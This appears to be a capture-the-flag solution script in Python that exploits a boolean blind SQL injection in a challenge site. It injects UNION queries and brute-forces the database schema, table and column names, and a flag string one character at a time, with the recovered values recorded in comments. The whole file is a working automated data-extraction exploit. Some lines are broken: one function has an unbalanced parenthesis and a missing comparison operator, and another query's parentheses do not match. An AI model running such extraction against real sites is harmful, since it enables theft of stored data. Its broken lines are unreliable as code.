import requests
import urllib.parse

URI = 'https://bluehens-blindsql.chals.io/?guess=0 UNION '
DEBUG = True

def guess(value):
	RESPONSE_OFFSET = 3949 # Where 'Nope' or 'Good Guess!' will be located
	r = requests.get(url = URI + value)
	answer = r.content[RESPONSE_OFFSET:].decode()
	if DEBUG:
		print(value, '->', answer)
	if answer == 'Good guess!':
		return True
	elif answer == 'Nope':
		return False
	elif 'no such table' in r.content.decode():
		return 'Unknown table'
	else:
		return r.content

guess("SELECT 1 FROM numbers WHERE (SELECT count(*) FROM numbers) = 1") # True

def guess_numeric_value(val):
	return guess("SELECT 1 FROM numbers WHERE (SELECT count(*) from numbers WHERE value > " + str(val) + ") = 1")

def find_number_value():
    # Find the number of digits of the value
	lower_bound = -1
	upper_bound = -1
	for x in range(50): # Assuming the number won't have more than 50 digits
		val = 10 ** x
		g = guess_numeric_value(val)
		if g:
			lower_bound = val
		if not g:
			upper_bound = val
			break
	# Binary search:
	while upper_bound - lower_bound > 1:
		current = (upper_bound + lower_bound) // 2
		g = guess_numeric_value(current)
		if g:
			lower_bound = current
		if not g:
			upper_bound = current
	if DEBUG:
		print(lower_bound, upper_bound)
	return upper_bound

print(find_number_value()) # 1192285233

guess("SELECT 1 FROM numbers WHERE (SELECT count(*) FROM sqlite_schema) > 1") # True
guess("SELECT 1 FROM numbers WHERE (SELECT count(*) FROM sqlite_schema) = 2") # True

# Declare an alphabet for brute forcing strings:
ALPHABET = [chr(x) for x in range(0x20, 0x7F)]
# Remove some characters, that could cause issues and probably are not part of the flag:
ALPHABET.remove('#') # URL hash mark
ALPHABET.remove('&') # URL parameter delimiter
ALPHABET.remove('%') # SQL wildcard character for zero or more characters
ALPHABET.remove("'") # SQL string delimiter
# Because '_' is a wildcard character for a single character in SQL "like" statements, check this one last to ensure the wildcard is used for the literal '_' character; thus remove it from the middle of the list and add it at the end!
ALPHABET.remove("_")
ALPHABET += ['_']

def find_string(base_query_start, base_query_end, val = ''):
	for _ in range(130): # check strings up to length 130
		added_new_char = False
        # check each character of the alphabet
		for x in ALPHABET:
			current = val + x
			query = base_query_start + current + base_query_end
			guess_result = guess(query)
			if guess_result:
                # if the character matches, append it to the current string and continue guessing the next character
				val = current
				added_new_char = True
				break
		if DEBUG:
			print(val)
        # If none of the characters in the ALPHABET worked, we've probably reached the end of the string!
		if not added_new_char:
			break
	return val

def find_table_name():
	base_query_start = "SELECT 1 FROM numbers WHERE (SELECT count(*) FROM sqlite_schema WHERE name != 'numbers' AND name like '"
	base_query_end = "%') = 1"
	return find_string(base_query_start, base_query_end)

find_table_name() # SECRET

guess('SELECT 1 FROM numbers WHERE (SELECT count(*) FROM SECRET) = 1') # False
guess('SELECT 1 FROM numbers WHERE (SELECT count(*) FROM SECRET) = 2') # True

def check_column_count(table_name, expected_count):
	col_count_res = guess("SELECT 1 FROM numbers WHERE (SELECT count(*) FROM (SELECT name FROM PRAGMA_TABLE_INFO('" + table_name + "'))) " + str(expected_count)))
	print('column count = ' + str(expected_count), col_count_res)
	return expected_count == col_count_res

check_column_count('SECRET', 1) # True

def find_column_name():
	base_query_start = "SELECT 1 FROM numbers WHERE (SELECT count(*) FROM (SELECT name FROM PRAGMA_TABLE_INFO('SECRET'))) WHERE name like '"
	base_query_end = "%') = 1"
	return find_string(base_query_start, base_query_end)

find_column_name() # FLAG

find_string("SELECT 1 FROM numbers WHERE (SELECT count(*) FROM SECRET WHERE flag like '", "%') > 0") # NOT THE FLAG

find_string("SELECT 1 FROM numbers WHERE (SELECT count(*) FROM SECRET WHERE flag != 'NOT THE FLAG' AND flag like '", "%') > 0") # UDCTF{L1K3_A_B4T}

guess("SELECT 1 FROM numbers WHERE (SELECT count(*) FROM SECRET WHERE flag = 'UDCTF{l1k3_a_b4t}') = 1") # True
